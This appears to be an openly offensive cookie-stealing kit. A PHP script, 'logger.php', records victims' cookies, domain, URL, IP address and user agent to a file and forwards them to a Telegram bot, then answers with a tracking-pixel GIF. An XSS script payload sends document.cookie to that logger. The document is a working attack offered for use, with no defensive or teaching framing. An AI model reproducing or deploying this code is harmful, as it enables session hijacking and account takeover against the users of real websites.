<?php
// logger.php

$cookie = isset($_GET['c']) ? $_GET['c'] : '';
$domain = isset($_GET['d']) ? $_GET['d'] : '';
$url = isset($_GET['u']) ? $_GET['u'] : '';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$time = date('Y-m-d H:i:s');

$log = "[{$time}] Domain: {$domain} | URL: {$url} | IP: {$ip} | Cookie: {$cookie} | UA: {$ua}\n";
file_put_contents(__DIR__ . '/cookies.txt', $log, FILE_APPEND);

$token = base64_decode('YOUR_BASE64_TOKEN');
$chatId = 'YOUR_CHAT_ID';
$msg = "🍪 Cookie Grabbed\n"
     . "Domain: {$domain}\n"
     . "URL: {$url}\n"
     . "Cookie: {$cookie}\n"
     . "IP: {$ip}";

@file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
    'chat_id' => $chatId,
    'text' => $msg,
]));

header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');

XSS Payload:

<script>new Image().src='https://YOUR_SERVER/logger.php?c='+document.cookie+'&d='+document.domain+'&u='+encodeURIComponent(location.href);</script>

💀
